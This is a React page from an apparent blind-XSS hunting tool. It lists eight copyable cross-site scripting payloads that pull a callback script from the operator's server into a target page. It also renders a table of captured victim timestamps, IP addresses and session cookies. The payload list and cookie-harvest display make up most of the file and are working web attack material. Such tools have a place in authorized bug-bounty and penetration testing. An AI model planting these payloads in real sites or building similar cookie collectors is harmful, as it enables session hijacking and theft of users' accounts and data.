import React, { useEffect, useState } from "react";
import PageNav from "./../components/PageNav";
import styles from "./BlindXssResults.module.css";

const BlindXssResults = () => {
  const [results, setResults] = useState([]);
  const [payloadCopied, setPayloadCopied] = useState(false);

  const payloads = [
    "<script src='http://localhost:8000/bxss.js'></script>",
    "<img src='x' onerror=\"var s=document.createElement('script');s.src='http://localhost:8000/bxss.js';document.body.appendChild(s);\">",
    "<svg/onload=\"fetch('http://localhost:8000/bxss.js')\">",
    "<iframe src='http://localhost:8000/bxss.js'></iframe>",
    "<body onload=\"fetch('http://localhost:8000/bxss.js')\">",
    "<a href=\"javascript:fetch('http://localhost:8000/bxss.js')\">Click me</a>",
    "<input type='image' src='x' onerror=\"var s=document.createElement('script');s.src='http://localhost:8000/bxss.js';document.body.appendChild(s);\">",
    "<form action='http://localhost:8000/bxss.js'><input type='submit'></form>",
  ];

  const copyToClipboard = (payload) => {
    navigator.clipboard.writeText(payload).then(
      () => {
        setPayloadCopied(true);
      },
      (err) => {
        console.error("Could not copy text: ", err);
      }
    );
  };

  useEffect(() => {
    const fetchResults = async () => {
      try {
        const userId = localStorage.getItem("userId");
        const response = await fetch(
          `http://localhost:8000/api/bxsshunter/xss-results?userId=${userId}`
        );
        const data = await response.json();
        setResults(data);
      } catch (error) {
        console.error("Error fetching XSS results:", error);
      }
    };

    fetchResults();
  }, []);

  return (
    <>
      <PageNav />
      <div className={styles.container}>
        <h2 className={styles.title}>Hunt For Blind XSS</h2>

        <div className={styles.payloadContainer}>
          <h3 className={styles.payloadTitle}>Possible Payloads</h3>
          {payloads.map((payload, index) => (
            <div key={index} className={styles.payload}>
              <span>{payload}</span>
              <button
                onClick={() => copyToClipboard(payload)}
                className={styles.copyButton}
              >
                Copy
              </button>
            </div>
          ))}
        </div>

        {payloadCopied && (
          <p className={styles.noResultsMessage}>
            We will let you know once the payload is executed.
          </p>
        )}

        {results.length > 0 ? (
          <table className={styles.table}>
            <thead>
              <tr>
                <th>Timestamp</th>
                <th>IP Address</th>
                <th>Cookie</th>
              </tr>
            </thead>
            <tbody>
              {results.map((result, index) => (
                <tr key={index}>
                  <td>{new Date(result.timestamp).toLocaleString()}</td>
                  <td>{result.ip}</td>
                  <td>{result.cookie}</td>
                </tr>
              ))}
            </tbody>
          </table>
        ) : (
          <></>
        )}
      </div>
    </>
  );
};

export default BlindXssResults;
